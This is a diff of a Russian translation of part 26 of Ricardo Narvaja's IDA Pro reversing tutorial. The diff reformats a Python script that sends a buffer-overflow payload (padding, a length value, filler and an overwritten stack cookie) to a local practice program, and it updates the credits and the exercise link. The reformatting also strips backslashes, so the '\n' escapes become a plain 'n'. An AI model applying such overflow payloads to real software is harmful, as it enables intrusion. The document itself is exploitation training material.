@@ -207,39 +207,49 @@
 Нам необходимо заполнить Buf 16-ю символами, затем заполнить два двойных слова \(8 байт - 8 символов\) и только после этого мы доберемся до cookie. Пэйлоад будет выглядеть так:
 Код \(Text\):
 
-1. 2. fruta= "A" \* 16 + numero + c + cookie
-3.
-Этот скрипт похож на предыдущий, который мы писали ранее:
-Код \(Text\):
+```python
+fruta= "A" * 16 + numero + c + cookie
+```
 
-1. 2. from subprocess import \*
-3. import struct
-4. p = Popen\(\[r'C:\Users\ricna\Documents\Visual Studio
-5. 2015\Projects\ConsoleApplication4\Release\ConsoleApplication4.exe',
-6. 'f'\], stdout=PIPE, stdin=PIPE, stderr=STDOUT\)
-7. print "ATACHEA EL DEBUGGER Y APRETA ENTER\n"
-8. raw\_input\(\)
-9. primera="-1\n"
-10. p.stdin.write\(primera\)
-11. numero=struct.pack\("&lt;L",0x1c\)
-12. c=struct.pack\("&lt;L",0x90909090\)
-13. cookie=struct.pack\("&lt;L",0x45934215\)
-14. fruta= "A" \* 16 + numero + c + cookie + "\n"
-15. p.stdin.write\(fruta\)
-16. testresult = p.communicate\(\)\[0\]
-17. print\(testresult\)
-18.
+Этот скрипт похож на предыдущий, который мы писали ранее:
+
+```python
+from subprocess import *
+import struct
+p = Popen([r'C:\Users\ricna\Documents\Visual Studio 2015\Projects\ConsoleApplication4\Release\ConsoleApplication4.exe', 'f'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)
+print "ATACHEA EL DEBUGGER Y APRETA ENTERn"
+raw_input()
+primera="-1n"
+p.stdin.write(primera)
+numero=struct.pack("<L",0x1c)
+c=struct.pack("<L",0x90909090)
+cookie=struct.pack("<L",0x45934215)
+fruta= "A" * 16 + numero + c + cookie + "n"
+p.stdin.write(fruta)
+testresult = p.communicate()[0]
+print(testresult)
+```
+
 Мы видим, здесь передается -1 для прохождения проверки на максимальную длину буфера. Затем передается сама строка, который состоит из 16 байт под буфер + 4 байта для максимальной длины буфера + 4 байта для temp-переменной + 4 байта под куки. Все значения, кроме кук, могут быть рандомными.
 
 ![](.gitbook/assets/26/42.png)
 
-Ну-с, на этом заканчиваем 26-ю часть.
+Ну-с, на этом заканчиваем 26-ю главу.
 
-В приложении к статье вы найдете упражнение под названием [IDA\_STRUCT.7z](https://filebin.ca/3jQpsAdobmih). Проверьте, уязвимо ли оно, и что с ним можно сделать.
-========================================================
-Автор текста: **Рикардо Нарваха** - **Ricardo** **Narvaja** \(**@ricnar456**\)
-Перевод на английский: **IvinsonCLS \(@IvinsonCLS\)**
-Перевод на русский с испанского+английского: **Яша\_Добрый\_Хакер\(Ростовский фанат Нарвахи\).**
-Перевод специально для форума системного и низкоуровневого программирования — **WASM.IN
+В приложении к статье вы найдете упражнение под названием [IDA\_STRUCT.7z](http://ricardonarvaja.info/WEB/INTRODUCCION%20AL%20REVERSING%20CON%20IDA%20PRO%20DESDE%20CERO/26-INTRODUCCION%20AL%20REVERSING%20CON%20IDA%20PRO%20DESDE%20CERO%20PARTE%2026.7z). Проверьте, уязвимо ли оно, и что с ним можно сделать.
+
+* * *
+
+Автор оригинального текста — Рикардо Нарваха.
+
+Перевод и адаптация на английский  язык — IvinsonCLS.
+
+Перевод и адаптация на русский язык — Яша Яшечкин.
+
+Перевод специально для форума системного и низкоуровневого программирования - WASM.IN
+
 03.12.2017
-Версия 1.0**
+
+Источник:
+
+[**http://ricardonarvaja.info/WEB/INTRODUCCION%20AL%20REVERSING%20CON%20IDA%20PRO%20DESDE%20CERO/26-INTRODUCCION%20AL%20REVERSING%20CON%20IDA%20PRO%20DESDE%20CERO%20PARTE%2026.7z**](http://ricardonarvaja.info/WEB/INTRODUCCION%20AL%20REVERSING%20CON%20IDA%20PRO%20DESDE%20CERO/26-INTRODUCCION%20AL%20REVERSING%20CON%20IDA%20PRO%20DESDE%20CERO%20PARTE%2026.7z)
